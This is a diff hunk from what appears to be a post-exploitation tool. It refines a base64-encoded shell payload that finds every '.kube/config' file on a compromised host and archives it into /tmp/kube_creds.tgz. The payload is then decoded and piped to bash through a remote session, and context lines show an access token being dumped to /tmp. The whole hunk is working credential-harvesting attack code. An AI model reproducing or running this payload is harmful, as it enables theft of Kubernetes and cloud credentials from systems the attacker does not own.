@@ -136,7 +136,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 
                 # create an archive of all kube creds
                 payload = base64.b64encode(
-                    b'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube\' \) \)  -printf \'%P\n\')')
+                    b'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')')
                 log("payload loaded and ready")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kubecreds | base64 -d | /bin/bash'",
